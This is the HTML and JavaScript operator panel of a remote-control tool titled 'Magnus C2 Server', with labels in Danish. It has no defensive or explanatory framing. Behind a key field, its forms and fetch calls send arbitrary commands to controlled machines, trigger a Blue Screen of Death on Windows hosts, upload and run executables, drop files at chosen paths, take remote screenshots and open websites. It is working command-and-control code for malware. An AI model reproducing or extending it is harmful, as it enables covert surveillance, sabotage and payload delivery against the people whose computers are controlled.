<!DOCTYPE html>

<style>
    .sendButton {
        width: 150px;
        height: fit-content;
        color: black;
        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
        cursor: pointer;
        font-size: medium;
    }

    .title {
        color: black;
        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
    }

    .greyColor {
        background-color: rgb(132, 132, 132);
    }

    .fullScreen {
        position: absolute;
        top: 0px;
        right: 0px;
        height: fit-content;
        left: 0px;
    }

    .center {
        text-align: center;
    }

    .scroll {
        scroll-behavior: auto;
    }

    .label {
        font-size: medium;
        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
        font-weight: bold;
    }

    .textarea {
        color: black;
        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
        font-size: small;
        width: 20%;
        height: 150px;
        resize: none;
    }

    .dropFileInput {
        color: black;
        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
        font-size: small;
        width: 30%;
        height: fit-content;
    }
</style>

<html>

    <head>
        <title>Magnus C2</title>
        <meta charset="utf8">
    </head>

    <body>
        <div class="center scroll greyColor fullScreen">
            <h1 class="title">Magnus C2 Server</h1>
            <input type="password" id="key" name="key" placeholder="Key">
            <h3 class="title">Command</h3>
            <input type="text" id="command" name="command" placeholder="Command">
            <br><br>
            <button class="sendButton" style="background-color: blueviolet;" onclick="sendCommand()">Send
                Command!</button>
            <h3 class="title">Vis billede</h3>
            <form enctype="multipart/form-data" id="imageForm">
                <input type="file" id="image" name="image">
                <br><br>
                <input type="submit" class="sendButton" style="background-color: greenyellow;" value="Send Billede!">
            </form>
            <h3 class="title">Blue Screen Of Death (BSOD)</h3>
            <label class="label">Virker kun på windows!</label>
            <br><br>
            <button class="sendButton" style="background-color: blue;" onclick="sendBSOD()">Start BSOD!</button>
            <h3 class="title">Kør fil</h3>
            <label class="label">Virker kun på windows!</label>
            <form enctype="multipart/form-data" id="runFileForm">
                <input type="file" id="runFile" name="runFile">
                <br>
                <input type="text" id="args" name="args" placeholder="Argumenter til programmet">
                <br><br>
                <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
            </form>
            <h3 class="title">Screenshot</h3>
            <button onclick="takeScreenshot()" class="sendButton" style="background-color: crimson;">Tag
                screenshot!</button>
            <br>
            <label class="label" style="font-weight: normal;">Links til screenshots kommer her:</label>
            <br>
            <textarea id="screenshotUrlsArea" name="screenshotUrlsArea" class="textarea"></textarea>
            <h3 class="title">Åbn Website</h3>
            <label class="label">Virker kun på windows!</label>
            <br>
            <input type="text" id="website" name="website" placeholder="Website">
            <br><br>
            <button class="sendButton" style="background-color: blueviolet;" onclick="sendWebsite()">Åbn
                Hjemmeside!</button>
            <h3 class="title">Drop fil</h3>
            <form enctype="multipart/form-data" id="dropFileForm">
                <input type="file" id="dropFile" name="dropFile">
                <br>
                <input class="dropFileInput" type="text" id="dropLocation" name="dropLocation"
                    placeholder="Sti til drop">
                <br><br>
                <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
            </form>
        </div>

        <script>
            var imageForm = document.getElementById("imageForm");
            imageForm.onsubmit = function (event) {
                var imageForm = event.currentTarget;
                var imageFormData = new FormData(imageForm);

                key = document.getElementById("key").value;

                fetch(`${document.URL}/post_image?key=${key}`, { "method": "POST", "body": imageFormData })
                    .then(response => {
                        if (response.status == 200) {
                            alert("Billede sendt!");
                        } else if (response.status == 403) {
                            alert("Forkert key!");
                        } else {
                            alert("Ukendt fejl!")
                        }
                    });

                event.preventDefault();
            }

            var runFileForm = document.getElementById("runFileForm");
            runFileForm.onsubmit = function (event) {
                var runFileForm = event.currentTarget;
                var runFileFormData = new FormData(runFileForm);

                key = document.getElementById("key").value;

                fetch(`${document.URL}/post_runfile?key=${key}`, { "method": "POST", "body": runFileFormData })
                    .then(response => {
                        if (response.status == 200) {
                            alert("Fil sendt!");
                        } else if (response.status == 403) {
                            alert("Forkert key!");
                        } else {
                            alert("Ukendt fejl!")
                        }
                    });

                event.preventDefault();
            }

            var dropFileForm = document.getElementById("dropFileForm");
            dropFileForm.onsubmit = function (event) {
                var dropFileForm = event.currentTarget;
                var dropFileFormData = new FormData(dropFileForm);

                key = document.getElementById("key").value;
                dropLocation = document.getElementById("dropLocation").value;
                dropFileFormData.append("location", dropLocation)

                fetch(`${document.URL}/post_dropfile?key=${key}`, { "method": "POST", "body": dropFileFormData })
                    .then(response => {
                        if (response.status == 200) {
                            alert("Fil sendt!");
                        } else if (response.status == 403) {
                            alert("Forkert key!");
                        } else {
                            alert("Ukendt fejl, check om du har skrevet en rigtig filsti!")
                        }
                    });

                event.preventDefault();
            }

            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            async function updateScreenshots(key) {
                screenshotUrlsArea = document.getElementById("screenshotUrlsArea");

                fetch(`${document.URL}/get_screenshots?key=${key}`,
                    {
                        method: "GET", headers: { "Accept": "application/json" }
                    })
                    .then(screenshotUrlsResponse => {
                        screenshotUrlsResponse.text().then(screenshotUrlsText => {
                            screenshotUrlsArea.value = screenshotUrlsText;
                            console.log(screenshotUrlsText);
                        });
                    });
            }

            async function takeScreenshot() {
                key = document.getElementById("key").value;

                response = await fetch(`${document.URL}/post_screenshot?key=${key}`,
                    {
                        method: "POST", headers: { "Accept": "application/json" }
                    });

                if (response.status == 200) {
                    alert("Screenshots er på vej!");
                } else if (response.status == 403) {
                    alert("Forkert key!");
                    return;
                } else {
                    alert("Ukendt fejl!");
                }

                for (let i = 0; i < 9; i++) {
                    await updateScreenshots(key);
                    await sleep(1000);
                }
            }

            async function sendBSOD() {
                key = document.getElementById("key").value;

                response = await fetch(`${document.URL}/post_bsod?key=${key}`,
                    {
                        method: "POST", headers: { "Accept": "application/json" }
                    });

                if (response.status == 200) {
                    alert("BSOD Startet!");
                } else if (response.status == 403) {
                    alert("Forkert key!");
                } else {
                    alert("Ukendt fejl!");
                }
            }

            async function sendWebsite() {
                key = document.getElementById("key").value;
                website = document.getElementById("website").value;

                response = await fetch(`${document.URL}/post_website?key=${key}&website=${website}`,
                    {
                        method: "POST", headers: { "Accept": "application/json" }
                    });

                if (response.status == 200) {
                    alert("Website sendt!");
                } else if (response.status == 403) {
                    alert("Forkert key!");
                } else {
                    alert("Ukendt fejl!");
                }
            }

            async function sendCommand() {
                key = document.getElementById("key").value;
                command = document.getElementById("command").value;

                response = await fetch(`${document.URL}/post_command?key=${key}&command=${command}`,
                    {
                        method: "POST", headers: { "Accept": "application/json" }
                    });

                if (response.status == 200) {
                    alert("Kommando sendt!");
                } else if (response.status == 403) {
                    alert("Forkert key!");
                } else {
                    alert("Ukendt fejl!");
                }
            }
        </script>
    </body>

</html>